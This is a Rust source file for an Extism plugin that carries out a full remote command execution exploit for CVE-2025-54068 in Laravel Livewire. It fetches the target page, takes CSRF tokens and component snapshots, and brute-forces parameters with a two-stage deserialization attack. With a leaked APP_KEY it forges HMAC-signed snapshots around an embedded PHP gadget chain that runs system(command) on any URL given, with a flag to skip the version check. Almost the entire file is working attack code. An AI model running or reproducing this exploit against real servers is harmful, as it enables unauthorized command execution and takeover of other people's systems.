use extism_pdk::*;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::Sha256;
use hmac::{Hmac, Mac};
use regex::Regex;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::collections::HashMap;

type HmacSha256 = Hmac<Sha256>;

// Split cookie header value that may have multiple cookies joined by comma
// This is tricky because cookie values can contain commas, but a new cookie
// typically starts with a pattern like "name=value" after the comma
fn split_cookies(cookie_header: &str) -> Vec<&str> {
    let mut result = Vec::new();
    let mut current_start = 0;
    
    // Look for patterns like ",COOKIENAME=" which indicate a new cookie
    // The comma may or may not be followed by a space
    let bytes = cookie_header.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if i > 0 && bytes[i] == b',' {
            // Skip optional space after comma
            let next_start = if i + 1 < bytes.len() && bytes[i + 1] == b' ' {
                i + 2
            } else {
                i + 1
            };
            
            if next_start < bytes.len() {
                // Check if what follows looks like a new cookie (contains = before any ;)
                let rest = &cookie_header[next_start..];
                if let Some(eq_pos) = rest.find('=') {
                    let semi_pos = rest.find(';').unwrap_or(rest.len());
                    // Also make sure the cookie name doesn't contain spaces (indicating it's not a valid cookie start)
                    let before_eq = &rest[..eq_pos];
                    if eq_pos < semi_pos && !before_eq.contains(' ') && !before_eq.is_empty() {
                        // This is a new cookie
                        result.push(&cookie_header[current_start..i]);
                        current_start = next_start;
                        i = current_start;
                        continue;
                    }
                }
            }
        }
        i += 1;
    }
    
    // Add the last segment
    if current_start < cookie_header.len() {
        result.push(&cookie_header[current_start..]);
    }
    
    result
}

// Embedded versions.json data for Livewire version checking
const LIVEWIRE_VERSIONS: &str = include_str!("../../../livepyre/exploit/versions.json");

// PHP deserialization payload template (from payload.json)
const PAYLOAD_TEMPLATE: &str = include_str!("../../../livepyre/exploit/payload.json");

#[derive(Serialize, Deserialize)]
struct PluginArgs {
    url: String,
    #[serde(default = "default_command")]
    command: String,
    #[serde(default)]
    headers: Option<Vec<String>>,
    #[serde(default)]
    app_key: Option<String>,
    #[serde(default)]
    debug: bool,
    #[serde(default)]
    force: bool,
    #[serde(default)]
    check: bool,
}

fn default_command() -> String {
    "id".to_string()
}

#[derive(Serialize)]
struct JsonSchema {
    #[serde(rename = "type")]
    schema_type: String,
    properties: SchemaProperties,
    required: Vec<String>,
}

#[derive(Serialize)]
struct SchemaProperties {
    url: PropertySchema,
    command: PropertySchema,
    headers: PropertySchema,
    app_key: PropertySchema,
    debug: PropertySchema,
    force: PropertySchema,
    check: PropertySchema,
}

#[derive(Serialize)]
struct PropertySchema {
    #[serde(rename = "type")]
    prop_type: String,
    description: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    default: Option<Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    items: Option<Box<PropertySchema>>,
}

#[plugin_fn]
pub fn name() -> FnResult<String> {
    Ok("cve-2025-54068-exploit".to_string())
}

#[plugin_fn]
pub fn description() -> FnResult<String> {
    Ok("Exploit plugin for CVE-2025-54068 - Livewire remote command execution vulnerability using PHP deserialization".to_string())
}

#[plugin_fn]
pub fn json_schema() -> FnResult<String> {
    let schema = JsonSchema {
        schema_type: "object".to_string(),
        properties: SchemaProperties {
            url: PropertySchema {
                prop_type: "string".to_string(),
                description: "Target URL of the Livewire application (required)".to_string(),
                default: None,
                items: None,
            },
            command: PropertySchema {
                prop_type: "string".to_string(),
                description: "Command to execute (default: id)".to_string(),
                default: Some(Value::String("id".to_string())),
                items: None,
            },
            headers: PropertySchema {
                prop_type: "array".to_string(),
                description: "Additional headers to add to the request (format: 'Header-Name: value')".to_string(),
                default: None,
                items: Some(Box::new(PropertySchema {
                    prop_type: "string".to_string(),
                    description: "Header in format 'Name: value'".to_string(),
                    default: None,
                    items: None,
                })),
            },
            app_key: PropertySchema {
                prop_type: "string".to_string(),
                description: "APP_KEY to sign snapshot (optional, enables exploit with APP_KEY)".to_string(),
                default: None,
                items: None,
            },
            debug: PropertySchema {
                prop_type: "boolean".to_string(),
                description: "Enable debug output".to_string(),
                default: Some(Value::Bool(false)),
                items: None,
            },
            force: PropertySchema {
                prop_type: "boolean".to_string(),
                description: "Force exploit even if version does not seem vulnerable".to_string(),
                default: Some(Value::Bool(false)),
                items: None,
            },
            check: PropertySchema {
                prop_type: "boolean".to_string(),
                description: "Only check if the remote target is vulnerable (only relevant for exploit without APP_KEY)".to_string(),
                default: Some(Value::Bool(false)),
                items: None,
            },
        },
        required: vec!["url".to_string()],
    };
    
    Ok(serde_json::to_string(&schema)?)
}

// Helper function to get base URL from full URL
fn get_base_url(url: &str) -> String {
    if let Some(scheme_end) = url.find("://") {
        if let Some(auth_end) = url[scheme_end + 3..].find('/') {
            format!("{}://{}/", &url[..scheme_end + 3], &url[scheme_end + 3..scheme_end + 3 + auth_end])
        } else {
            format!("{}/", url)
        }
    } else {
        format!("{}/", url)
    }
}

// Extract snapshots from HTML using regex
fn extract_snapshots(html: &str) -> Vec<String> {
    let re = Regex::new(r#"wire:snapshot="([^"]*)""#).unwrap_or_else(|_| Regex::new("").unwrap());
    re.captures_iter(html)
        .filter_map(|cap| cap.get(1))
        .map(|m| m.as_str().to_string())
        .collect()
}

// HTML unescape function (handles common entities)
fn html_unescape(s: &str) -> String {
    s.replace("&quot;", "\"")
        .replace("&#34;", "\"")
        .replace("&#39;", "'")
        .replace("&#x27;", "'")
        .replace("&apos;", "'")
        .replace("&lt;", "<")
        .replace("&#60;", "<")
        .replace("&gt;", ">")
        .replace("&#62;", ">")
        .replace("&amp;", "&")
        .replace("&#38;", "&")
}

// Extract CSRF token from HTML
fn get_csrf_token(html: &str) -> Option<String> {
    // Try data-csrf attribute
    if let Some(start) = html.find("data-csrf=\"") {
        if let Some(end) = html[start + 11..].find('"') {
            return Some(html[start + 11..start + 11 + end].to_string());
        }
    }
    
    // Try livewireScriptConfig
    if let Some(start) = html.find("livewireScriptConfig = ") {
        if let Some(end) = html[start..].find(';') {
            let config_str = &html[start + 23..start + end];
            if let Ok(config) = serde_json::from_str::<Value>(config_str) {
                if let Some(csrf) = config.get("csrf").and_then(|v| v.as_str()) {
                    return Some(csrf.to_string());
                }
            }
        }
    }
    
    // Try csrf-token meta tag
    if let Some(start) = html.find("name=\"csrf-token\"") {
        if let Some(content_start) = html[start..].find("content=\"") {
            if let Some(end) = html[start + content_start + 9..].find('"') {
                return Some(html[start + content_start + 9..start + content_start + 9 + end].to_string());
            }
        }
    }
    
    None
}

// Extract update URI from HTML
fn get_update_uri(html: &str) -> Option<String> {
    // Try livewireScriptConfig
    if let Some(start) = html.find("livewireScriptConfig = ") {
        if let Some(end) = html[start..].find(';') {
            let config_str = &html[start + 23..start + end];
            if let Ok(config) = serde_json::from_str::<Value>(config_str) {
                if let Some(uri) = config.get("uri").and_then(|v| v.as_str()) {
                    let uri_trimmed = uri.trim_start_matches('/');
                    return Some(uri_trimmed.to_string());
                }
            }
        }
    }
    
    // Try data-update-uri attribute
    if let Some(start) = html.find("data-update-uri=\"") {
        if let Some(end) = html[start + 17..].find('"') {
            let uri = &html[start + 17..start + 17 + end];
            if uri.starts_with("http") {
                return Some(uri.to_string());
            } else {
                let uri_trimmed = uri.trim_start_matches('/');
                return Some(uri_trimmed.to_string());
            }
        }
    }
    
    // Default to livewire/update
    Some("livewire/update".to_string())
}

// Check if Livewire is present
fn check_livewire(html: &str) -> bool {
    html.to_lowercase().contains("livewire")
}

// Check Livewire version
fn check_livewire_version(html: &str, force: bool) -> Option<String> {
    if force {
        return Some("FORCED".to_string());
    }
    
    let html_lower = html.to_lowercase();
    if let Ok(versions) = serde_json::from_str::<HashMap<String, String>>(LIVEWIRE_VERSIONS) {
        for (version, hash) in versions {
            if html_lower.contains(&hash.to_lowercase()) {
                // Check if version is vulnerable (< v3.6.4)
                let version_num = version.trim_start_matches('v');
                let parts: Vec<&str> = version_num.split('.').collect();
                if parts.len() >= 2 {
                    let major: u32 = parts[0].parse().unwrap_or(0);
                    let minor: u32 = parts[1].parse().unwrap_or(0);
                    let patch: u32 = parts.get(2).and_then(|p| p.split('-').next()).and_then(|p| p.parse().ok()).unwrap_or(0);
                    
                    if major < 3 || (major == 3 && minor < 6) || (major == 3 && minor == 6 && patch < 4) {
                        return Some(format!("VULNERABLE: {}", version));
                    } else {
                        return Some(format!("PATCHED: {}", version));
                    }
                }
                return Some(version);
            }
        }
    }
    
    None
}

// Check if snapshots exist
fn check_snapshot(html: &str) -> bool {
    html.to_lowercase().contains("wire:snapshot")
}

// Check for array/object parameter in snapshot data (takes data object directly like Python)
fn check_array_param(data: &serde_json::Map<String, Value>) -> Option<String> {
    let strict_synth = vec!["str", "std", "int", "float", "mdl"];
    
    for (param, value) in data {
        // Check if value is an array with objects
        if let Some(arr) = value.as_array() {
            for entry in arr {
                if let Some(entry_obj) = entry.as_object() {
                    if let Some(s) = entry_obj.get("s").and_then(|v| v.as_str()) {
                        if !strict_synth.contains(&s) {
                            return Some(param.clone());
                        }
                    }
                }
            }
        }
    }
    
    None
}

// Parse APP_KEY (from Laravel encrypter)
fn retrieve_key(app_key: &str) -> Vec<u8> {
    if app_key.starts_with("base64:") {
        if let Ok(decoded) = BASE64.decode(&app_key[7..]) {
            return decoded;
        }
    }
    
    if app_key.len() == 44 {
        if let Ok(decoded) = BASE64.decode(app_key) {
            return decoded;
        }
    }
    
    app_key.as_bytes().to_vec()
}

// Calculate checksum for snapshot (Laravel style)
fn checksum(snapshot: &str, app_key: &str) -> String {
    let key = retrieve_key(app_key);
    // Remove all spaces and replace / with \/
    let processed = snapshot.replace(" ", "").replace("/", "\\/");
    let mut mac = HmacSha256::new_from_slice(&key)
        .expect("HMAC can take key of any size");
    mac.update(processed.as_bytes());
    let result = mac.finalize();
    hex::encode(result.into_bytes())
}

// Stage 1: Cast parameter as array (for exploit without APP_KEY)
fn stage1(
    base_url: &str,
    update_uri: &str,
    token: &str,
    param_name: &str,
    snapshot: &str,
    headers: &Option<Vec<String>>,
    cookies: &str,
) -> Result<String, String> {
    let payload = json!({
        "_token": token,
        "components": [
            {
                "snapshot": snapshot,
                "updates": {
                    param_name: []
                },
                "calls": []
            }
        ]
    });
    
    let url = if update_uri.starts_with("http") {
        update_uri.to_string()
    } else {
        format!("{}{}", base_url.trim_end_matches('/'), if update_uri.starts_with('/') { "" } else { "/" })
            + update_uri
    };
    
    let mut req = HttpRequest::new(&url)
        .with_method("POST")
        .with_header("Content-Type", "application/json")
        .with_header("X-Requested-With", "XMLHttpRequest");
    
    // Add cookies from the GET request
    if !cookies.is_empty() {
        req = req.with_header("Cookie", cookies);
    }
    
    if let Some(custom_headers) = headers {
        for header in custom_headers {
            if let Some((name, value)) = header.split_once(':') {
                req = req.with_header(name.trim(), value.trim());
            }
        }
    }
    
    let payload_str = payload.to_string();
    match http::request::<Vec<u8>>(&req, Some(payload_str.as_bytes().to_vec())) {
        Ok(res) => {
            if res.status_code() == 200 {
                let body = String::from_utf8_lossy(&res.body()).to_string();
                // Parse response to get new snapshot
                if let Ok(response_json) = serde_json::from_str::<Value>(&body) {
                    if let Some(components) = response_json.get("components").and_then(|v| v.as_array()) {
                        if let Some(first) = components.first() {
                            if let Some(new_snapshot) = first.get("snapshot").and_then(|v| v.as_str()) {
                                return Ok(new_snapshot.to_string());
                            }
                        }
                    }
                }
                Err("Failed to extract snapshot from stage1 response".to_string())
            } else {
                Err(format!("Stage1 failed with status: {}", res.status_code()))
            }
        }
        Err(e) => Err(format!("Stage1 request failed: {}", e)),
    }
}

// Stage 2: Send RCE payload (for exploit without APP_KEY)
fn stage2(
    base_url: &str,
    update_uri: &str,
    token: &str,
    snapshot: &str,
    param: &str,
    function: &str,
    command_param: &str,
    headers: &Option<Vec<String>>,
    cookies: &str,
) -> Result<String, String> {
    // Load payload template and replace placeholders
    let mut payload_template = serde_json::from_str::<Value>(PAYLOAD_TEMPLATE)
        .map_err(|e| format!("Failed to parse payload template: {}", e))?;
    
    // Set token and snapshot
    payload_template["_token"] = json!(token);
    payload_template["components"][0]["snapshot"] = json!(snapshot);
    
    // Replace TARGET with actual parameter name
    let updates = payload_template["components"][0]["updates"].as_object_mut()
        .ok_or("Invalid payload template structure")?;
    
    if let Some(target_value) = updates.remove("TARGET") {
        updates.insert(param.to_string(), target_value);
    }
    
    // Replace function and param placeholders in the chained string
    // Navigate manually like Python: updates[param][1][0]["a"][0]["close"][0][0][0]["chained"][0]
    if let Some(components) = payload_template.get_mut("components").and_then(|v| v.as_array_mut()) {
        if let Some(first_component) = components.get_mut(0) {
            if let Some(updates) = first_component.get_mut("updates").and_then(|v| v.as_object_mut()) {
                if let Some(param_value) = updates.get_mut(param).and_then(|v| v.as_array_mut()) {
                    // param_value is [1, [array]]
                    if let Some(array_element) = param_value.get_mut(1).and_then(|v| v.as_array_mut()) {
                        // array_element is the array of objects
                        if let Some(first_obj) = array_element.get_mut(0).and_then(|v| v.as_object_mut()) {
                            if let Some(a_array) = first_obj.get_mut("a").and_then(|v| v.as_array_mut()) {
                                if let Some(a_obj) = a_array.get_mut(0).and_then(|v| v.as_object_mut()) {
                                    if let Some(close_array) = a_obj.get_mut("close").and_then(|v| v.as_array_mut()) {
                                        if let Some(close_first) = close_array.get_mut(0).and_then(|v| v.as_array_mut()) {
                                            if let Some(close_second) = close_first.get_mut(0).and_then(|v| v.as_array_mut()) {
                                                if let Some(chained_obj) = close_second.get_mut(0).and_then(|v| v.as_object_mut()) {
                                                    if let Some(chained_array) = chained_obj.get_mut("chained").and_then(|v| v.as_array_mut()) {
                                                        if let Some(chained_value) = chained_array.get_mut(0) {
                                                            // Get the string value, replace placeholders, then set it back
                                                            if let Some(chained_str) = chained_value.as_str() {
                                                                let replaced = chained_str
                                                                    .replace("[FUNCTION_LEN]", &function.len().to_string())
                                                                    .replace("[FUNCTION]", function)
                                                                    .replace("[PARAM_LEN]", &command_param.len().to_string())
                                                                    .replace("[PARAM]", command_param);
                                                                *chained_value = json!(replaced);
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    let url = if update_uri.starts_with("http") {
        update_uri.to_string()
    } else {
        format!("{}{}", base_url.trim_end_matches('/'), if update_uri.starts_with('/') { "" } else { "/" })
            + update_uri
    };
    
    let mut req = HttpRequest::new(&url)
        .with_method("POST")
        .with_header("Content-Type", "application/json")
        .with_header("X-Requested-With", "XMLHttpRequest");
    
    // Add cookies from the GET request
    if !cookies.is_empty() {
        req = req.with_header("Cookie", cookies);
    }
    
    if let Some(custom_headers) = headers {
        for header in custom_headers {
            if let Some((name, value)) = header.split_once(':') {
                req = req.with_header(name.trim(), value.trim());
            }
        }
    }
    
    let payload_str = payload_template.to_string();
    match http::request::<Vec<u8>>(&req, Some(payload_str.as_bytes().to_vec())) {
        Ok(res) => {
            let status_code = res.status_code();
            let body = String::from_utf8_lossy(&res.body()).to_string();
            // Success is status 200 AND body does NOT contain "snapshot" (like Python: status != 200 or '"snapshot"' in res.text is False)
            if status_code == 200 && !body.contains("\"snapshot\"") {
                Ok(body)
            } else {
                // Return more detailed error
                Err(format!("Stage2 failed - status: {}, body_length: {}, contains_snapshot: {}, body_preview: {}", 
                    status_code, 
                    body.len(),
                    body.contains("\"snapshot\""),
                    if body.len() > 200 { &body[..200] } else { &body }))
            }
        }
        Err(e) => Err(format!("Stage2 request failed: {}", e)),
    }
}

// Exploit without APP_KEY
fn exploit_without_app_key(
    url: &str,
    function: &str,
    command_param: &str,
    headers: &Option<Vec<String>>,
    check: bool,
    force: bool,
    _debug: bool,
) -> Value {
    let base_url = get_base_url(url);
    
    // Fetch the page
    let mut req = HttpRequest::new(url)
        .with_method("GET")
        .with_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    
    if let Some(custom_headers) = headers {
        for header in custom_headers {
            if let Some((name, value)) = header.split_once(':') {
                req = req.with_header(name.trim(), value.trim());
            }
        }
    }
    
    // Store cookies from response to use in subsequent requests
    let mut cookie_parts: Vec<String> = Vec::new();
    
    let page_html = match http::request::<Vec<u8>>(&req, None) {
        Ok(res) => {
            if res.status_code() >= 200 && res.status_code() < 300 {
                // Extract cookies from headers
                for (key, value) in res.headers() {
                    if key.to_lowercase() == "set-cookie" {
                        // Multiple cookies may be comma-separated
                        for cookie_part in split_cookies(&value) {
                            // Extract just name=value before the first semicolon
                            let cookie_nv = cookie_part.split(';').next().unwrap_or(&cookie_part).trim();
                            if !cookie_nv.is_empty() && cookie_nv.contains('=') {
                                cookie_parts.push(cookie_nv.to_string());
                            }
                        }
                    }
                }
                String::from_utf8_lossy(&res.body()).to_string()
            } else {
                return json!({
                    "url": url,
                    "mode": "without_app_key",
                    "success": false,
                    "error": format!("Failed to fetch page: HTTP {}", res.status_code()),
                });
            }
        }
        Err(e) => {
            return json!({
                "url": url,
                "mode": "without_app_key",
                "success": false,
                "error": format!("Failed to fetch page: {}", e),
            });
        }
    };
    
    let cookies = cookie_parts.join("; ");
    
    // Check if Livewire
    if !check_livewire(&page_html) {
        return json!({
            "url": url,
            "mode": "without_app_key",
            "success": false,
            "error": "Target does not seem to be running Livewire",
        });
    }
    
    // Check version
    let version_status = check_livewire_version(&page_html, force);
    if let Some(vs) = &version_status {
        if vs.starts_with("PATCHED") && !force {
            return json!({
                "url": url,
                "mode": "without_app_key",
                "success": false,
                "error": format!("Target is not vulnerable: {}", vs),
            });
        }
    }
    
    if check {
        let is_vulnerable = version_status.as_ref().map(|v| v.starts_with("VULNERABLE")).unwrap_or(false);
        return json!({
            "url": url,
            "mode": "check",
            "vulnerable": is_vulnerable,
            "version_status": version_status,
        });
    }
    
    // Check for snapshots
    if !check_snapshot(&page_html) {
        return json!({
            "url": url,
            "mode": "without_app_key",
            "success": false,
            "error": "No snapshots found",
        });
    }
    
    // Extract CSRF token and update URI
    let token = match get_csrf_token(&page_html) {
        Some(t) => t,
        None => {
            return json!({
                "url": url,
                "mode": "without_app_key",
                "success": false,
                "error": "Impossible to locate CSRF token",
            });
        }
    };
    
    let update_uri = match get_update_uri(&page_html) {
        Some(u) => u,
        None => {
            return json!({
                "url": url,
                "mode": "without_app_key",
                "success": false,
                "error": "Impossible to locate update URI",
            });
        }
    };
    
    // Extract snapshots
    let all_snapshots = extract_snapshots(&page_html);
    
    if all_snapshots.is_empty() {
        return json!({
            "url": url,
            "mode": "without_app_key",
            "success": false,
            "error": "No snapshots found in page",
        });
    }
    
    // Try each snapshot
    for snapshot_str in all_snapshots {
        let unescaped = html_unescape(&snapshot_str);
        let snapshot_json: Value = match serde_json::from_str(&unescaped) {
            Ok(v) => v,
            Err(_) => continue,
        };
        
        // Check if snapshot has data
        if let Some(data_obj) = snapshot_json.get("data").and_then(|v| v.as_object()) {
            if data_obj.is_empty() {
                continue;
            }
            
            // Use the unescaped original JSON string directly (don't re-serialize to avoid key order changes)
            let snapshot_json_str = unescaped.clone();
            
            // Check for object-type parameter first - pass data object like Python does
            if let Some(param) = check_array_param(data_obj) {
                // Try direct stage2 - use JSON string representation like Python does
                match stage2(&base_url, &update_uri, &token, &snapshot_json_str, &param, function, command_param, headers, &cookies) {
                    Ok(result) => {
                        return json!({
                            "url": url,
                            "mode": "without_app_key",
                            "success": true,
                            "command_executed": format!("{}({})", function, command_param),
                            "output": result,
                            "param_used": param,
                        });
                    }
                    Err(e) => {
                        // Return detailed error for debugging
                        return json!({
                            "url": url,
                            "mode": "without_app_key",
                            "success": false,
                            "error": format!("stage2 failed for object-type param"),
                            "param_tried": param,
                            "stage2_error": e,
                            "cookies_extracted": cookies,
                        });
                    }
                }
            }
            
            // Bruteforce all parameters
            for param in data_obj.keys() {
                // Stage 1: Cast as array - use JSON string representation
                match stage1(&base_url, &update_uri, &token, param, &snapshot_json_str, headers, &cookies) {
                    Ok(new_snapshot) => {
                        // Stage 2: Send RCE payload
                        match stage2(&base_url, &update_uri, &token, &new_snapshot, param, function, command_param, headers, &cookies) {
                            Ok(result) => {
                                return json!({
                                    "url": url,
                                    "mode": "without_app_key",
                                    "success": true,
                                    "command_executed": format!("{}({})", function, command_param),
                                    "output": result,
                                    "param_used": param,
                                });
                            }
                            Err(_e) => {
                                // Continue to next param
                            }
                        }
                    }
                    Err(_e) => {
                        // Continue to next param if stage1 fails
                    }
                }
            }
        }
    }
    
    json!({
        "url": url,
        "mode": "without_app_key",
        "success": false,
        "error": "Exploit failed - tried all snapshots and parameters",
        "base_url": base_url,
        "update_uri": update_uri,
        "csrf_token_found": true,
    })
}

// Build payload for exploit with APP_KEY
fn build_payload_with_appkey(snapshot: &mut Value, app_key: &str, function: &str, command_param: &str) -> Result<String, String> {
    // Get first parameter
    let first_param = snapshot.get("data")
        .and_then(|v| v.as_object())
        .and_then(|obj| obj.keys().next())
        .ok_or("Snapshot data is empty")?
        .clone();
    
    // Build PHP deserialization payload for the first param
    let payload_value = json!([
        1,
        [
            {
                "a": [
                    {
                        "__toString": "phpversion",
                        "close": [
                            [
                                [
                                    {
                                        "chained": [
                                            format!("O:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":4:{{s:5:\"dummy\";O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{{s:9:\"\u{0000}*\u{0000}events\";O:31:\"Illuminate\\Validation\\Validator\":1:{{s:10:\"extensions\";a:1:{{s:0:\"\";s:{}:\"{}\";}}}}s:8:\"\u{0000}*\u{0000}event\";s:{}:\"{}\";}}s:10:\"connection\";N;s:5:\"queue\";N;s:5:\"event\";O:37:\"Illuminate\\Notifications\\Notification\":0:{{}}}}", function.len(), function, command_param.len(), command_param)
                                        ]
                                    },
                                    {
                                        "s": "form",
                                        "class": "Illuminate\\Broadcasting\\BroadcastEvent"
                                    }
                                ],
                                "dispatchNextJobInChain"
                            ],
                            {
                                "s": "clctn",
                                "class": "Laravel\\SerializableClosure\\Serializers\\Signed"
                            }
                        ]
                    },
                    {
                        "s": "clctn",
                        "class": "GuzzleHttp\\Psr7\\FnStream"
                    }
                ],
                "b": [
                    {
                        "__toString": [
                            [
                                [
                                    null,
                                    {
                                        "s": "mdl",
                                        "class": "Laravel\\Prompts\\Terminal"
                                    }
                                ],
                                "exit"
                            ],
                            {
                                "s": "clctn",
                                "class": "Laravel\\SerializableClosure\\Serializers\\Signed"
                            }
                        ]
                    },
                    {
                        "s": "clctn",
                        "class": "GuzzleHttp\\Psr7\\FnStream"
                    }
                ]
            },
            {
                "class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator",
                "s": "clctn"
            }
        ]
    ]);
    
    // Replace first param with payload
    if let Some(data_obj) = snapshot.get_mut("data").and_then(|v| v.as_object_mut()) {
        data_obj.insert(first_param.clone(), payload_value);
    }
    
    // Remove checksum if present
    if let Some(obj) = snapshot.as_object_mut() {
        obj.remove("checksum");
    }
    
    // Calculate new checksum on snapshot WITHOUT checksum
    let snapshot_for_checksum = snapshot.to_string().replace(" ", "").replace("/", "\\/");
    let checksum_value = checksum(&snapshot_for_checksum, app_key);
    
    // Add checksum back to snapshot
    if let Some(obj) = snapshot.as_object_mut() {
        obj.insert("checksum".to_string(), json!(checksum_value));
    }
    
    // Return snapshot WITH checksum (processed for Laravel format)
    let final_snapshot = snapshot.to_string().replace(" ", "").replace("/", "\\/");
    Ok(final_snapshot)
}

// Exploit with APP_KEY
fn exploit_with_app_key(
    url: &str,
    function: &str,
    command_param: &str,
    app_key: &str,
    headers: &Option<Vec<String>>,
    _debug: bool,
) -> Value {
    let base_url = get_base_url(url);
    
    // Fetch the page
    let mut req = HttpRequest::new(url)
        .with_method("GET")
        .with_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    
    if let Some(custom_headers) = headers {
        for header in custom_headers {
            if let Some((name, value)) = header.split_once(':') {
                req = req.with_header(name.trim(), value.trim());
            }
        }
    }
    
    let page_html = match http::request::<Vec<u8>>(&req, None) {
        Ok(res) => {
            if res.status_code() >= 200 && res.status_code() < 300 {
                String::from_utf8_lossy(&res.body()).to_string()
            } else {
                return json!({
                    "url": url,
                    "mode": "with_app_key",
                    "success": false,
                    "error": format!("Failed to fetch page: HTTP {}", res.status_code()),
                });
            }
        }
        Err(e) => {
            return json!({
                "url": url,
                "mode": "with_app_key",
                "success": false,
                "error": format!("Failed to fetch page: {}", e),
            });
        }
    };
    
    // Check if Livewire
    if !check_livewire(&page_html) {
        return json!({
            "url": url,
            "mode": "with_app_key",
            "success": false,
            "error": "Target does not seem to be running Livewire",
        });
    }
    
    // Check for snapshots
    if !check_snapshot(&page_html) {
        return json!({
            "url": url,
            "mode": "with_app_key",
            "success": false,
            "error": "No snapshots found",
        });
    }
    
    // Extract CSRF token and update URI
    let token = match get_csrf_token(&page_html) {
        Some(t) => t,
        None => {
            return json!({
                "url": url,
                "mode": "with_app_key",
                "success": false,
                "error": "Impossible to locate CSRF token",
            });
        }
    };
    
    let update_uri = match get_update_uri(&page_html) {
        Some(u) => u,
        None => {
            return json!({
                "url": url,
                "mode": "with_app_key",
                "success": false,
                "error": "Impossible to locate update URI",
            });
        }
    };
    
    // Extract snapshots
    let all_snapshots = extract_snapshots(&page_html);
    
    if all_snapshots.is_empty() {
        return json!({
            "url": url,
            "mode": "with_app_key",
            "success": false,
            "error": "No snapshots found in page",
        });
    }
    
    // Try each snapshot
    for snapshot_str in all_snapshots {
        let unescaped = html_unescape(&snapshot_str);
        let mut snapshot_json: Value = match serde_json::from_str(&unescaped) {
            Ok(v) => v,
            Err(_) => continue,
        };
        
        // Remove checksum if present
        if let Some(obj) = snapshot_json.as_object_mut() {
            obj.remove("checksum");
        }
        
        // Check if snapshot has data
        if let Some(data_obj) = snapshot_json.get("data").and_then(|v| v.as_object()) {
            if data_obj.is_empty() {
                continue;
            }
            
            // Build payload
            match build_payload_with_appkey(&mut snapshot_json, app_key, function, command_param) {
                Ok(signed_snapshot) => {
                    let payload = json!({
                        "_token": token,
                        "components": [
                            {
                                "snapshot": signed_snapshot,
                                "updates": {},
                                "calls": []
                            }
                        ]
                    });
                    
                    let url_full = if update_uri.starts_with("http") {
                        update_uri.to_string()
                    } else {
                        format!("{}{}", base_url.trim_end_matches('/'), if update_uri.starts_with('/') { "" } else { "/" })
                            + &update_uri
                    };
                    
                    let mut req = HttpRequest::new(&url_full)
                        .with_method("POST")
                        .with_header("Content-Type", "application/json")
                        .with_header("X-Requested-With", "XMLHttpRequest");
                    
                    if let Some(custom_headers) = headers {
                        for header in custom_headers {
                            if let Some((name, value)) = header.split_once(':') {
                                req = req.with_header(name.trim(), value.trim());
                            }
                        }
                    }
                    
                    let payload_str = payload.to_string();
                    match http::request::<Vec<u8>>(&req, Some(payload_str.as_bytes().to_vec())) {
                        Ok(res) => {
                            let body = String::from_utf8_lossy(&res.body()).to_string();
                            if res.status_code() == 200 {
                                return json!({
                                    "url": url,
                                    "mode": "with_app_key",
                                    "success": true,
                                    "command_executed": format!("{}({})", function, command_param),
                                    "output": body,
                                });
                            } else {
                                return json!({
                                    "url": url,
                                    "mode": "with_app_key",
                                    "success": false,
                                    "error": format!("Server error: HTTP {}, APP_KEY might be incorrect", res.status_code()),
                                    "response_body": body,
                                });
                            }
                        }
                        Err(e) => {
                            return json!({
                                "url": url,
                                "mode": "with_app_key",
                                "success": false,
                                "error": format!("Request failed: {}", e),
                            });
                        }
                    }
                }
                Err(_e) => {
                    continue;
                }
            }
        }
    }
    
    json!({
        "url": url,
        "mode": "with_app_key",
        "success": false,
        "error": "Exploit failed - tried all snapshots",
    })
}

#[plugin_fn]
pub fn execute() -> FnResult<Json<Value>> {
    let input: Json<PluginArgs> = input()?;
    let args = input.0;
    
    // Validate required parameter
    if args.url.trim().is_empty() {
        return Err(WithReturnCode::new(
            Error::msg("url parameter is required"),
            1,
        ));
    }
    
    // Parse command - if it's in format "function('param')", extract function and param
    // Otherwise, default to system(command)
    let (function, command_param) = if args.command.contains('(') && args.command.contains(')') {
        if let Some(open_paren) = args.command.find('(') {
            let func = args.command[..open_paren].trim().to_string();
            if let Some(close_paren) = args.command.rfind(')') {
                let param = args.command[open_paren + 1..close_paren]
                    .trim_matches(|c| c == '"' || c == '\'')
                    .to_string();
                (func, param)
            } else {
                ("system".to_string(), args.command)
            }
        } else {
            ("system".to_string(), args.command)
        }
    } else {
        ("system".to_string(), args.command)
    };
    
    // Execute exploit based on whether APP_KEY is provided
    let result = if let Some(app_key) = args.app_key {
        exploit_with_app_key(
            &args.url,
            &function,
            &command_param,
            &app_key,
            &args.headers,
            args.debug,
        )
    } else {
        exploit_without_app_key(
            &args.url,
            &function,
            &command_param,
            &args.headers,
            args.check,
            args.force,
            args.debug,
        )
    };
    
    Ok(Json(result))
}
